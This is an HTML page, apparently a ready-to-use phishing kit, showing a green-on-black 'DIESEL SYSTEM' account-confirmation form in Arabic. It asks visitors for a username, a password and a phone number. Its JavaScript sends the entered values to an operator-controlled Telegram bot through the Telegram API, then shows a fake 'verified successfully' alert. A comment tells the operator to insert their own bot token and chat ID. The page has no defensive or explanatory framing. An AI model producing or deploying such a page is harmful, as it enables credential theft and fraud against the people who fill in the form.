<!DOCTYPE html>
<html dir="rtl">
<head>
    <style>
        body { background: #000; color: #00ff41; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { border: 2px solid #00ff41; padding: 30px; border-radius: 15px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #222; border: 1px solid #333; color: white; }
        button { background: #00ff41; border: none; padding: 10px 20px; width: 100%; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>DIESEL SYSTEM</h2>
        <input id="user" placeholder="اليوزر نيم">
        <input id="pass" type="password" placeholder="الباسورد">
        <input id="phone" placeholder="رقم التليفون">
        <button onclick="sendData()">تأكيد الحساب</button>
    </div>

    <script>
        function sendData() {
            let u = document.getElementById('user').value;
            let p = document.getElementById('pass').value;
            let ph = document.getElementById('phone').value;
            
            // هنا ضع التوكن الجديد بتاعك والـ ChatID
            let token = "YOUR_NEW_TOKEN"; 
            let chatId = "YOUR_CHAT_ID";
            let msg = `طلب جديد: %0Aاليوزر: ${u} %0Aالباسورد: ${p} %0Aالهاتف: ${ph}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`);
            alert("تم التحقق بنجاح! سيتم التنفيذ قريباً.");
        }
    </script>
</body>
</html>
